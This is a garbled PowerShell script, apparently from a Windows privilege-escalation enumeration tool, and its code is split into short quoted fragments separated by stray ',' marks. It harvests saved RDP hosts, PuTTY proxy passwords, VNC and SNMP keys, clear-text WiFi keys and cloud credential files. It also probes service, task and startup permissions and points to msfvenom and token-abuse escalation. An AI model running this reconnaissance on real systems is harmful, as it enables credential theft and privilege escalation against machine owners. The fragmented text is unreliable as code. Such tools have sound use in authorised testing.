if (Test-Path "$e','nv:USERPROFILE\app','data\Local\Microso','ft\Remote Desktop ','Connection Manager','\RDCMan.settings")',' {
  Write-Host "R','DCMan Settings Fou','nd at: $($env:USER','PROFILE)\appdata\L','ocal\Microsoft\Rem','ote Desktop Connec','tion Manager\RDCMa','n.settings" -Foreg','roundColor Red
}
e','lse { Write-Host "','No RDCMan.Settings',' found." }


Write','-Host ""
if ($Time','Stamp) { TimeElaps','ed }
Write-Host -F','oregroundColor Blu','e "=========|| RDP',' Saved Connections',' Check"

Write-Hos','t "HK_Users"
New-P','SDrive -PSProvider',' Registry -Name HK','U -Root HKEY_USERS',' -ErrorAction Sile','ntlyContinue
Get-C','hildItem HKU:\ -Er','rorAction Silently','Continue | ForEach','-Object {
  # get ','the SID from outpu','t
  $HKUSID = $_.N','ame.Replace(''HKEY_','USERS\'', "")
  if ','(Test-Path "regist','ry::HKEY_USERS\$HK','USID\Software\Micr','osoft\Terminal Ser','ver Client\Default','") {
    Write-Hos','t "Server Found: $','((Get-ItemProperty',' "registry::HKEY_U','SERS\$HKUSID\Softw','are\Microsoft\Term','inal Server Client','\Default" -Name MR','U0).MRU0)"
  }
  e','lse { Write-Host "','Not found for $($_','.Name)" }
}

Write','-Host "HKCU"
if (T','est-Path "registry','::HKEY_CURRENT_USE','R\Software\Microso','ft\Terminal Server',' Client\Default") ','{
  Write-Host "Se','rver Found: $((Get','-ItemProperty "reg','istry::HKEY_CURREN','T_USER\Software\Mi','crosoft\Terminal S','erver Client\Defau','lt" -Name MRU0).MR','U0)"
}
else { Writ','e-Host "Terminal S','erver Client not f','ound in HCKU" }

W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' Putty Stored Cred','entials Check"

if',' (Test-Path HKCU:\','SOFTWARE\SimonTath','am\PuTTY\Sessions)',' {
  Get-ChildItem',' HKCU:\SOFTWARE\Si','monTatham\PuTTY\Se','ssions | ForEach-O','bject {
    $RegKe','yName = Split-Path',' $_.Name -Leaf
   ',' Write-Host "Key: ','$RegKeyName"
    @','("HostName", "Port','Number", "UserName','", "PublicKeyFile"',', "PortForwardings','", "ConnectionShar','ing", "ProxyUserna','me", "ProxyPasswor','d") | ForEach-Obje','ct {
      Write-H','ost "$_ :"
      W','rite-Host "$((Get-','ItemProperty  HKCU',':\SOFTWARE\SimonTa','tham\PuTTY\Session','s\$RegKeyName).$_)','"
    }
  }
}
else',' { Write-Host "No ','putty credentials ','found in HKCU:\SOF','TWARE\SimonTatham\','PuTTY\Sessions" }
','

Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| SSH Key Checks','"
Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| If found:"
Wri','te-Host "https://b','log.ropnop.com/ext','racting-ssh-privat','e-keys-from-window','s-10-ssh-agent/" -','ForegroundColor Ye','llow
Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| Checking Pu','tty SSH KNOWN HOST','S"
if (Test-Path H','KCU:\Software\Simo','nTatham\PuTTY\SshH','ostKeys) { 
  Writ','e-Host "$((Get-Ite','m -Path HKCU:\Soft','ware\SimonTatham\P','uTTY\SshHostKeys).','Property)"
}
else ','{ Write-Host "No p','utty ssh keys foun','d" }


Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| Checking ','for OpenSSH Keys"
','if (Test-Path HKCU',':\Software\OpenSSH','\Agent\Keys) { Wri','te-Host "OpenSSH k','eys found. Try thi','s for decryption: ','https://github.com','/ropnop/windows_ss','hagent_extract" -F','oregroundColor Yel','low }
else { Write','-Host "No OpenSSH ','Keys found." }


W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' Checking for WinV','NC Passwords"
if (','Test-Path "HKCU:\S','oftware\ORL\WinVNC','3\Password") { Wri','te-Host " WinVNC f','ound at HKCU:\Soft','ware\ORL\WinVNC3\P','assword" }else { W','rite-Host "No WinV','NC found." }


Wri','te-Host ""
if ($Ti','meStamp) { TimeEla','psed }
Write-Host ','-ForegroundColor B','lue "=========|| C','hecking for SNMP P','asswords"
if (Test','-Path "HKLM:\SYSTE','M\CurrentControlSe','t\Services\SNMP") ','{ Write-Host "SNMP',' Key found at HKLM',':\SYSTEM\CurrentCo','ntrolSet\Services\','SNMP" }else { Writ','e-Host "No SNMP fo','und." }


Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| Checki','ng for TightVNC Pa','sswords"
if (Test-','Path "HKCU:\Softwa','re\TightVNC\Server','") { Write-Host "T','ightVNC key found ','at HKCU:\Software\','TightVNC\Server" }','else { Write-Host ','"No TightVNC found','." }


Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| UAC Setti','ngs"
if ((Get-Item','Property HKLM:\SOF','TWARE\Microsoft\Wi','ndows\CurrentVersi','on\Policies\System',').EnableLUA -eq 1)',' {
  Write-Host "E','nableLUA is equal ','to 1. Part or all ','of the UAC compone','nts are on."
  Wri','te-Host "https://b','ook.hacktricks.wik','i/en/windows-harde','ning/authenticatio','n-credentials-uac-','and-efs/uac-user-a','ccount-control.htm','l#very-basic-uac-b','ypass-full-file-sy','stem-access" -Fore','groundColor Yellow','
}
else { Write-Ho','st "EnableLUA valu','e not equal to 1" ','}


Write-Host ""
','if ($TimeStamp) { ','TimeElapsed }
Writ','e-Host -Foreground','Color Blue "======','===|| Recently Run',' Commands (WIN+R)"','

Get-ChildItem HK','U:\ -ErrorAction S','ilentlyContinue | ','ForEach-Object {
 ',' # get the SID fro','m output
  $HKUSID',' = $_.Name.Replace','(''HKEY_USERS\'', ""',')
  $property = (G','et-Item "HKU:\$_\S','OFTWARE\Microsoft\','Windows\CurrentVer','sion\Explorer\RunM','RU" -ErrorAction S','ilentlyContinue).P','roperty
  $HKUSID ','| ForEach-Object {','
    if (Test-Path',' "HKU:\$_\SOFTWARE','\Microsoft\Windows','\CurrentVersion\Ex','plorer\RunMRU") {
','      Write-Host -','ForegroundColor Bl','ue "=========||HKU',' Recently Run Comm','ands"
      foreac','h ($p in $property',') {
        Write-','Host "$((Get-Item ','"HKU:\$_\SOFTWARE\','Microsoft\Windows\','CurrentVersion\Exp','lorer\RunMRU" -Err','orAction SilentlyC','ontinue).getValue(','$p))" 
      }
   ',' }
  }
}


Write-H','ost ""
if ($TimeSt','amp) { TimeElapsed',' }
Write-Host -For','egroundColor Blue ','"=========||HKCU R','ecently Run Comman','ds"
$property = (G','et-Item "HKCU:\SOF','TWARE\Microsoft\Wi','ndows\CurrentVersi','on\Explorer\RunMRU','" -ErrorAction Sil','entlyContinue).Pro','perty
foreach ($p ','in $property) {
  ','Write-Host "$((Get','-Item "HKCU:\SOFTW','ARE\Microsoft\Wind','ows\CurrentVersion','\Explorer\RunMRU" ','-ErrorAction Silen','tlyContinue).getVa','lue($p))"
}


Writ','e-Host ""
if ($Tim','eStamp) { TimeElap','sed }
Write-Host -','ForegroundColor Bl','ue "=========|| Al','ways Install Eleva','ted Check"
 
 
Wri','te-Host "Checking ','Windows Installer ','Registry (will pop','ulate if the key e','xists)"
if ((Get-I','temProperty HKLM:\','SOFTWARE\Policies\','Microsoft\Windows\','Installer -ErrorAc','tion SilentlyConti','nue).AlwaysInstall','Elevated -eq 1) {
','  Write-Host "HKLM',':\SOFTWARE\Policie','s\Microsoft\Window','s\Installer).Alway','sInstallElevated =',' 1" -ForegroundCol','or red
  Write-Hos','t "Try msfvenom ms','i package to escal','ate" -ForegroundCo','lor red
  Write-Ho','st "https://book.h','acktricks.wiki/en/','windows-hardening/','windows-local-priv','ilege-escalation/i','ndex.html#metasplo','it-payloads" -Fore','groundColor Yellow','
}
 
if ((Get-Item','Property HKCU:\SOF','TWARE\Policies\Mic','rosoft\Windows\Ins','taller -ErrorActio','n SilentlyContinue',').AlwaysInstallEle','vated -eq 1) { 
  ','Write-Host "HKCU:\','SOFTWARE\Policies\','Microsoft\Windows\','Installer).AlwaysI','nstallElevated = 1','" -ForegroundColor',' red
  Write-Host ','"Try msfvenom msi ','package to escalat','e" -ForegroundColo','r red
  Write-Host',' "https://book.hac','ktricks.wiki/en/wi','ndows-hardening/wi','ndows-local-privil','ege-escalation/ind','ex.html#metasploit','-payloads" -Foregr','oundColor Yellow
}','


Write-Host ""
i','f ($TimeStamp) { T','imeElapsed }
Write','-Host -ForegroundC','olor Blue "=======','==|| PowerShell In','fo"

(Get-ItemProp','erty registry::HKE','Y_LOCAL_MACHINE\SO','FTWARE\Microsoft\P','owerShell\1\PowerS','hellEngine).PowerS','hellVersion | ForE','ach-Object {
  Wri','te-Host "PowerShel','l $_ available"
}
','(Get-ItemProperty ','registry::HKEY_LOC','AL_MACHINE\SOFTWAR','E\Microsoft\PowerS','hell\3\PowerShellE','ngine).PowerShellV','ersion | ForEach-O','bject {
  Write-Ho','st  "PowerShell $_',' available"
}


Wr','ite-Host ""
if ($T','imeStamp) { TimeEl','apsed }
Write-Host',' -ForegroundColor ','Blue "=========|| ','PowerShell Registr','y Transcript Check','"

if (Test-Path H','KCU:\Software\Poli','cies\Microsoft\Win','dows\PowerShell\Tr','anscription) {
  G','et-Item HKCU:\Soft','ware\Policies\Micr','osoft\Windows\Powe','rShell\Transcripti','on
}
if (Test-Path',' HKLM:\Software\Po','licies\Microsoft\W','indows\PowerShell\','Transcription) {
 ',' Get-Item HKLM:\So','ftware\Policies\Mi','crosoft\Windows\Po','werShell\Transcrip','tion
}
if (Test-Pa','th HKCU:\Wow6432No','de\Software\Polici','es\Microsoft\Windo','ws\PowerShell\Tran','scription) {
  Get','-Item HKCU:\Wow643','2Node\Software\Pol','icies\Microsoft\Wi','ndows\PowerShell\T','ranscription
}
if ','(Test-Path HKLM:\W','ow6432Node\Softwar','e\Policies\Microso','ft\Windows\PowerSh','ell\Transcription)',' {
  Get-Item HKLM',':\Wow6432Node\Soft','ware\Policies\Micr','osoft\Windows\Powe','rShell\Transcripti','on
}
 

Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| PowerShe','ll Module Log Chec','k"
if (Test-Path H','KCU:\Software\Poli','cies\Microsoft\Win','dows\PowerShell\Mo','duleLogging) {
  G','et-Item HKCU:\Soft','ware\Policies\Micr','osoft\Windows\Powe','rShell\ModuleLoggi','ng
}
if (Test-Path',' HKLM:\Software\Po','licies\Microsoft\W','indows\PowerShell\','ModuleLogging) {
 ',' Get-Item HKLM:\So','ftware\Policies\Mi','crosoft\Windows\Po','werShell\ModuleLog','ging
}
if (Test-Pa','th HKCU:\Wow6432No','de\Software\Polici','es\Microsoft\Windo','ws\PowerShell\Modu','leLogging) {
  Get','-Item HKCU:\Wow643','2Node\Software\Pol','icies\Microsoft\Wi','ndows\PowerShell\M','oduleLogging
}
if ','(Test-Path HKLM:\W','ow6432Node\Softwar','e\Policies\Microso','ft\Windows\PowerSh','ell\ModuleLogging)',' {
  Get-Item HKLM',':\Wow6432Node\Soft','ware\Policies\Micr','osoft\Windows\Powe','rShell\ModuleLoggi','ng
}
 

Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| PowerShe','ll Script Block Lo','g Check"
 
if ( Te','st-Path HKCU:\Soft','ware\Policies\Micr','osoft\Windows\Powe','rShell\ScriptBlock','Logging) {
  Get-I','tem HKCU:\Software','\Policies\Microsof','t\Windows\PowerShe','ll\ScriptBlockLogg','ing
}
if ( Test-Pa','th HKLM:\Software\','Policies\Microsoft','\Windows\PowerShel','l\ScriptBlockLoggi','ng) {
  Get-Item H','KLM:\Software\Poli','cies\Microsoft\Win','dows\PowerShell\Sc','riptBlockLogging
}','
if ( Test-Path HK','CU:\Wow6432Node\So','ftware\Policies\Mi','crosoft\Windows\Po','werShell\ScriptBlo','ckLogging) {
  Get','-Item HKCU:\Wow643','2Node\Software\Pol','icies\Microsoft\Wi','ndows\PowerShell\S','criptBlockLogging
','}
if ( Test-Path H','KLM:\Wow6432Node\S','oftware\Policies\M','icrosoft\Windows\P','owerShell\ScriptBl','ockLogging) {
  Ge','t-Item HKLM:\Wow64','32Node\Software\Po','licies\Microsoft\W','indows\PowerShell\','ScriptBlockLogging','
}


Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| WSUS check ','for http and UseWA','Server = 1, if tru','e, might be vulner','able to exploit"
W','rite-Host "https:/','/book.hacktricks.w','iki/en/windows-har','dening/windows-loc','al-privilege-escal','ation/index.html#w','sus" -ForegroundCo','lor Yellow
if (Tes','t-Path HKLM:\SOFTW','ARE\Policies\Micro','soft\Windows\Windo','wsUpdate) {
  Get-','Item HKLM:\SOFTWAR','E\Policies\Microso','ft\Windows\Windows','Update
}
if ((Get-','ItemProperty HKLM:','\SOFTWARE\Policies','\Microsoft\Windows','\WindowsUpdate\AU ','-Name "USEWUServer','" -ErrorAction Sil','entlyContinue).Use','WUServer) {
  (Get','-ItemProperty HKLM',':\SOFTWARE\Policie','s\Microsoft\Window','s\WindowsUpdate\AU',' -Name "USEWUServe','r").UseWUServer
}
','

Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| Internet Setti','ngs HKCU / HKLM"

','$property = (Get-I','tem "HKCU:\Softwar','e\Microsoft\Window','s\CurrentVersion\I','nternet Settings" ','-ErrorAction Silen','tlyContinue).Prope','rty
foreach ($p in',' $property) {
  Wr','ite-Host "$p - $((','Get-Item "HKCU:\So','ftware\Microsoft\W','indows\CurrentVers','ion\Internet Setti','ngs" -ErrorAction ','SilentlyContinue).','getValue($p))"
}
 ','
$property = (Get-','Item "HKLM:\Softwa','re\Microsoft\Windo','ws\CurrentVersion\','Internet Settings"',' -ErrorAction Sile','ntlyContinue).Prop','erty
foreach ($p i','n $property) {
  W','rite-Host "$p - $(','(Get-Item "HKLM:\S','oftware\Microsoft\','Windows\CurrentVer','sion\Internet Sett','ings" -ErrorAction',' SilentlyContinue)','.getValue($p))"
}
','

################','######## PROCESS I','NFORMATION #######','#################
','Write-Host ""
if (','$TimeStamp) { Time','Elapsed }
Write-Ho','st -ForegroundColo','r Blue "=========|','| RUNNING PROCESSE','S"


Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| Checking us','er permissions on ','running processes"','
Get-Process | Sel','ect-Object Path -U','nique | ForEach-Ob','ject { Start-ACLCh','eck -Target $_.pat','h }


#TODO, vulne','rable system proce','ss running that we',' have access to. 
','Write-Host ""
if (','$TimeStamp) { Time','Elapsed }
Write-Ho','st -ForegroundColo','r Blue "=========|','| System processes','"
Start-Process ta','sklist -ArgumentLi','st ''/v /fi "userna','me eq system"'' -Wa','it -NoNewWindow


','##################','###### SERVICES ##','##################','####
Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| SERVICE pat','h vulnerable check','"
Write-Host "Chec','king for vulnerabl','e service .exe"
# ','Gathers all servic','es running and sto','pped, based on .ex','e and shows the Ac','cessControlList
$U','niqueServices = @{','}
Get-WmiObject Wi','n32_Service | Wher','e-Object { $_.Path','Name -like ''*.exe*',''' } | ForEach-Obje','ct {
  $Path = ($_','.PathName -split ''','(?<=\.exe\b)'')[0].','Trim(''"'')
  $Uniqu','eServices[$Path] =',' $_.Name
}
foreach',' ( $h in ($UniqueS','ervices | Select-O','bject -Unique).Get','Enumerator()) {
  ','Start-ACLCheck -Ta','rget $h.Name -Serv','iceName $h.Value
}','


###############','######### UNQUOTED',' SERVICE PATH CHEC','K ############
Wri','te-Host ""
if ($Ti','meStamp) { TimeEla','psed }
Write-Host ','-ForegroundColor B','lue "=========|| C','hecking for Unquot','ed Service Paths"
','# All credit to Iv','an-Sincek
# https:','//github.com/ivan-','sincek/unquoted-se','rvice-paths/blob/m','aster/src/unquoted','_service_paths_min','i.ps1

UnquotedSer','vicePathCheck


##','##################','#### REGISTRY SERV','ICE CONFIGURATION ','CHECK ###
Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| Checki','ng Service Registr','y Permissions"
Wri','te-Host "This will',' take some time."
','
Get-ChildItem ''HK','LM:\System\Current','ControlSet\service','s\'' | ForEach-Obje','ct {
  $target = $','_.Name.Replace("HK','EY_LOCAL_MACHINE",',' "hklm:")
  Start-','aclcheck -Target $','target
}


#######','################# ','SCHEDULED TASKS ##','##################','####
Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| SCHEDULED T','ASKS vulnerable ch','eck"
#Scheduled ta','sks audit 


Write','-Host ""
if ($Time','Stamp) { TimeElaps','ed }
Write-Host -F','oregroundColor Blu','e "=========|| Tes','ting access to c:\','windows\system32\t','asks"
if (Get-Chil','dItem "c:\windows\','system32\tasks" -E','rrorAction Silentl','yContinue) {
  Wri','te-Host "Access co','nfirmed, may need ','futher investigati','on"
  Get-ChildIte','m "c:\windows\syst','em32\tasks"
}
else',' {
  Write-Host "N','o admin access to ','scheduled tasks fo','lder."
  Get-Sched','uledTask | Where-O','bject { $_.TaskPat','h -notlike "\Micro','soft*" } | ForEach','-Object {
    $Act','ions = $_.Actions.','Execute
    if ($A','ctions -ne $null) ','{
      foreach ($','a in $actions) {
 ','       if ($a -lik','e "%windir%*") { $','a = $a.replace("%w','indir%", $Env:wind','ir) }
        else','if ($a -like "%Sys','temRoot%*") { $a =',' $a.replace("%Syst','emRoot%", $Env:win','dir) }
        els','eif ($a -like "%lo','calappdata%*") { $','a = $a.replace("%l','ocalappdata%", "$e','nv:UserProfile\app','data\local") }
   ','     elseif ($a -l','ike "%appdata%*") ','{ $a = $a.replace(','"%localappdata%", ','$env:Appdata) }
  ','      $a = $a.Repl','ace(''"'', '''')
     ','   Start-ACLCheck ','-Target $a
       ',' Write-Host "`n"
 ','       Write-Host ','"TaskName: $($_.Ta','skName)"
        W','rite-Host "-------','------"
        Ne','w-Object -TypeName',' PSObject -Propert','y ([Ordered]@{
   ','       LastResult ','= $(($_ | Get-Sche','duledTaskInfo).Las','tTaskResult)
     ','     NextRun    = ','$(($_ | Get-Schedu','ledTaskInfo).NextR','unTime)
          ','Status     = $_.St','ate
          Comm','and    = $_.Action','s.execute
        ','  Arguments  = $_.','Actions.Arguments ','
        }) | Writ','e-Host
      } 
  ','  }
  }
}


######','##################',' STARTUP APPLIICAT','IONS #############','############
Write','-Host ""
if ($Time','Stamp) { TimeElaps','ed }
Write-Host -F','oregroundColor Blu','e "=========|| STA','RTUP APPLICATIONS ','Vulnerable Check"
','"Check if you can ','modify any binary ','that is going to b','e executed by admi','n or if you can im','personate a not fo','und binary"
Write-','Host "https://book','.hacktricks.wiki/e','n/windows-hardenin','g/windows-local-pr','ivilege-escalation','/index.html#run-at','-startup" -Foregro','undColor Yellow

@','("C:\Documents and',' Settings\All User','s\Start Menu\Progr','ams\Startup",
  "C',':\Documents and Se','ttings\$env:Userna','me\Start Menu\Prog','rams\Startup", 
  ','"$env:ProgramData\','Microsoft\Windows\','Start Menu\Program','s\Startup", 
  "$e','nv:Appdata\Microso','ft\Windows\Start M','enu\Programs\Start','up") | ForEach-Obj','ect {
  if (Test-P','ath $_) {
    # Ch','eckACL of each top',' folder then each ','sub folder/file
  ','  Start-ACLCheck $','_
    Get-ChildIte','m -Recurse -Force ','-Path $_ | ForEach','-Object {
      $S','ubItem = $_.FullNa','me
      if (Test-','Path $SubItem) { 
','        Start-ACLC','heck -Target $SubI','tem
      }
    }
','  }
}


Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| STARTUP ','APPS Registry Chec','k"

@("registry::H','KLM\Software\Micro','soft\Windows\Curre','ntVersion\Run",
  ','"registry::HKLM\So','ftware\Microsoft\W','indows\CurrentVers','ion\RunOnce",
  "r','egistry::HKCU\Soft','ware\Microsoft\Win','dows\CurrentVersio','n\Run",
  "registr','y::HKCU\Software\M','icrosoft\Windows\C','urrentVersion\RunO','nce") | ForEach-Ob','ject {
  # CheckAC','L of each Property',' Value found
  $RO','Path = $_
  (Get-I','tem $_) | ForEach-','Object {
    $ROPr','operty = $_.proper','ty
    $ROProperty',' | ForEach-Object ','{
      Start-ACLC','heck ((Get-ItemPro','perty -Path $ROPat','h).$_ -split ''(?<=','\.exe\b)'')[0].Trim','(''"'')
    }
  }
}
','
#schtasks /query ','/fo TABLE /nh | fi','ndstr /v /i "disab','le deshab informa"','


###############','######### INSTALLE','D APPLICATIONS ###','##################','###
Write-Host ""
','if ($TimeStamp) { ','TimeElapsed }
Writ','e-Host -Foreground','Color Blue "======','===|| INSTALLED AP','PLICATIONS"
Write-','Host "Generating l','ist of installed a','pplications"

#Get',' applications via ','Regsitry
Get-Insta','lledApplications

','Write-Host ""
if (','$TimeStamp) { Time','Elapsed }
Write-Ho','st -ForegroundColo','r Blue "=========|','| LOOKING FOR BASH','.EXE"
Get-ChildIte','m C:\Windows\WinSx','S\ -Filter "amd64_','microsoft-windows-','lxss-bash*" | ForE','ach-Object {
  Wri','te-Host $((Get-Chi','ldItem $_.FullName',' -Recurse -Filter ','"*bash.exe*").Full','Name)
}
@("bash.ex','e", "wsl.exe") | F','orEach-Object { Wr','ite-Host $((Get-Ch','ildItem C:\Windows','\System32\ -Filter',' $_).FullName) }

','
Write-Host ""
if ','($TimeStamp) { Tim','eElapsed }
Write-H','ost -ForegroundCol','or Blue "=========','|| LOOKING FOR SCC','M CLIENT"
$result ','= Get-WmiObject -N','amespace "root\ccm','\clientSDK" -Class',' CCM_Application -','Property * -ErrorA','ction SilentlyCont','inue | Select-Obje','ct Name, SoftwareV','ersion
if ($result',') { $result }
else','if (Test-Path ''C:\','Windows\CCM\SCClie','nt.exe'') { Write-H','ost "SCCM Client f','ound at C:\Windows','\CCM\SCClient.exe"',' -ForegroundColor ','Cyan }
else { Writ','e-Host "Not Instal','led." }


########','################ N','ETWORK INFORMATION',' #################','#######
Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| NETWORK ','INFORMATION"

Writ','e-Host ""
if ($Tim','eStamp) { TimeElap','sed }
Write-Host -','ForegroundColor Bl','ue "=========|| HO','STS FILE"

Write-H','ost "Get content o','f etc\hosts file"
','Get-Content "c:\wi','ndows\system32\dri','vers\etc\hosts"

W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' IP INFORMATION"

','# Get all v4 and v','6 addresses
Write-','Host ""
if ($TimeS','tamp) { TimeElapse','d }
Write-Host -Fo','regroundColor Blue',' "=========|| Ipco','nfig ALL"
Start-Pr','ocess ipconfig.exe',' -ArgumentList "/a','ll" -Wait -NoNewWi','ndow


Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| DNS Cache','"
ipconfig /displa','ydns | Select-Stri','ng "Record" | ForE','ach-Object { Write','-Host $(''{0}'' -f $','_) }
 
Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| LISTENING',' PORTS"

# running',' netstat as powers','hell is too slow t','o print to console','
Start-Process NET','STAT.EXE -Argument','List "-ano" -Wait ','-NoNewWindow


Wri','te-Host ""
if ($Ti','meStamp) { TimeEla','psed }
Write-Host ','-ForegroundColor B','lue "=========|| A','RP Table"

# Arp t','able info
Start-Pr','ocess arp -Argumen','tList "-A" -Wait -','NoNewWindow

Write','-Host ""
if ($Time','Stamp) { TimeElaps','ed }
Write-Host -F','oregroundColor Blu','e "=========|| Rou','tes"

# Route info','
Start-Process rou','te -ArgumentList "','print" -Wait -NoNe','wWindow

Write-Hos','t ""
if ($TimeStam','p) { TimeElapsed }','
Write-Host -Foreg','roundColor Blue "=','========|| Network',' Adapter info"

# ','Network Adapter in','fo
Get-NetAdapter ','| ForEach-Object {',' 
  Write-Host "--','--------"
  Write-','Host $_.Name
  Wri','te-Host $_.Interfa','ceDescription
  Wr','ite-Host $_.ifInde','x
  Write-Host $_.','Status
  Write-Hos','t $_.MacAddress
  ','Write-Host "------','----"
} 


Write-H','ost ""
if ($TimeSt','amp) { TimeElapsed',' }
Write-Host -For','egroundColor Blue ','"=========|| Check','ing for WiFi passw','ords"
# Select all',' wifi adapters, th','en pull the SSID a','long with the pass','word

((netsh.exe ','wlan show profiles',') -match ''\s{2,}:\','s'').replace("    A','ll User Profile   ','  : ", "") | ForEa','ch-Object {
  nets','h wlan show profil','e name="$_" key=cl','ear 
}


Write-Hos','t ""
if ($TimeStam','p) { TimeElapsed }','
Write-Host -Foreg','roundColor Blue "=','========|| Enabled',' firewall rules - ','displaying command',' only - it can ove','rwrite the display',' buffer"
Write-Hos','t -ForegroundColor',' Blue "=========||',' show all rules wi','th: netsh advfirew','all firewall show ','rule dir=in name=a','ll"
# Route info

','Write-Host ""
if (','$TimeStamp) { Time','Elapsed }
Write-Ho','st -ForegroundColo','r Blue "=========|','| SMB SHARES"
Writ','e-Host "Will enume','rate SMB Shares an','d Access if any ar','e available" 

Get','-SmbShare | Get-Sm','bShareAccess | For','Each-Object {
  $S','MBShareObject = $_','
# see line 70 for',' explanation of wh','at this does
  who','ami.exe /groups /f','o csv | select-obj','ect -skip 2 | Conv','ertFrom-Csv -Heade','r ''group name'' | S','elect-Object -Expa','ndProperty ''group ','name'' | ForEach-Ob','ject {
    if ($SM','BShareObject.Accou','ntName -like $_ -a','nd ($SMBShareObjec','t.AccessRight -lik','e "Full" -or "Chan','ge") -and $SMBShar','eObject.AccessCont','rolType -like "All','ow" ) {
      Writ','e-Host -Foreground','Color red "$($SMBS','hareObject.Account','Name) has $($SMBSh','areObject.AccessRi','ght) to $($SMBShar','eObject.Name)"
   ',' }
  }
}


#######','################# ','USER INFO ########','################
W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' USER INFO"
Write-','Host "== || Genera','ting List of all L','ocal Administrator','s, Users and Backu','p Operators (if an','y exist)"

# Code ','has been modified ','to accomodate for ','any language by fi','ltering only on th','e output and not l','ooking for a strin','g of text
# Foreac','h loop to get all ','local groups, then',' examine each grou','p''s members.
Get-L','ocalGroup | ForEac','h-Object {
  "`n G','roup: $($_.Name) `','n"
  if(Get-LocalG','roupMember -name $','_.Name){
    (Get-','LocalGroupMember -','name $_.Name).Name','
  }
  else{
    "','     {GROUP EMPTY}','"
  }
}


Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| USER D','IRECTORY ACCESS CH','ECK"
Get-ChildItem',' C:\Users\* | ForE','ach-Object {
  if ','(Get-ChildItem $_.','FullName -ErrorAct','ion SilentlyContin','ue) {
    Write-Ho','st -ForegroundColo','r red "Read Access',' to $($_.FullName)','"
  }
}

#Whoami 
','Write-Host ""
if (','$TimeStamp) { Time','Elapsed }
Write-Ho','st -ForegroundColo','r Blue "=========|','| WHOAMI INFO"
Wri','te-Host ""
if ($Ti','meStamp) { TimeEla','psed }
Write-Host ','-ForegroundColor B','lue "=========|| C','heck Token access ','here: https://book','.hacktricks.wiki/e','n/windows-hardenin','g/windows-local-pr','ivilege-escalation','/privilege-escalat','ion-abusing-tokens','.html#abusing-toke','ns" -ForegroundCol','or yellow
Write-Ho','st -ForegroundColo','r Blue "=========|','| Check if you are',' inside the Admini','strators group or ','if you have enable','d any token that c','an be use to escal','ate privileges lik','e SeImpersonatePri','vilege, SeAssignPr','imaryPrivilege, Se','TcbPrivilege, SeBa','ckupPrivilege, SeR','estorePrivilege, S','eCreateTokenPrivil','ege, SeLoadDriverP','rivilege, SeTakeOw','nershipPrivilege, ','SeDebbugPrivilege"','
Write-Host "https','://book.hacktricks','.wiki/en/windows-h','ardening/windows-l','ocal-privilege-esc','alation/index.html','#users--groups" -F','oregroundColor Yel','low
Start-Process ','whoami.exe -Argume','ntList "/all" -Wai','t -NoNewWindow


W','rite-Host ""
if ($','TimeStamp) { TimeE','lapsed }
Write-Hos','t -ForegroundColor',' Blue "=========||',' Cloud Credentials',' Check"
$Users = (','Get-ChildItem C:\U','sers).Name
$CCreds',' = @(".aws\credent','ials",
  "AppData\','Roaming\gcloud\cre','dentials.db",
  "A','ppData\Roaming\gcl','oud\legacy_credent','ials",
  "AppData\','Roaming\gcloud\acc','ess_tokens.db",
  ','".azure\accessToke','ns.json",
  ".azur','e\azureProfile.jso','n") 
foreach ($u i','n $users) {
  $CCr','eds | ForEach-Obje','ct {
    if (Test-','Path "c:\Users\$u\','$_") { Write-Host ','"$_ found!" -Foreg','roundColor Red }
 ',' }
}


Write-Host ','""
if ($TimeStamp)',' { TimeElapsed }
W','rite-Host -Foregro','undColor Blue "===','======|| APPcmd Ch','eck"
if (Test-Path',' ("$Env:SystemRoot','\System32\inetsrv\','appcmd.exe")) {
  ','Write-Host "https:','//book.hacktricks.','wiki/en/windows-ha','rdening/windows-lo','cal-privilege-esca','lation/index.html#','appcmdexe" -Foregr','oundColor Yellow
 ',' Write-Host "$Env:','SystemRoot\System3','2\inetsrv\appcmd.e','xe exists!" -Foreg','roundColor Red
}

','
Write-Host ""
if ','($TimeStamp) { Tim','eElapsed }
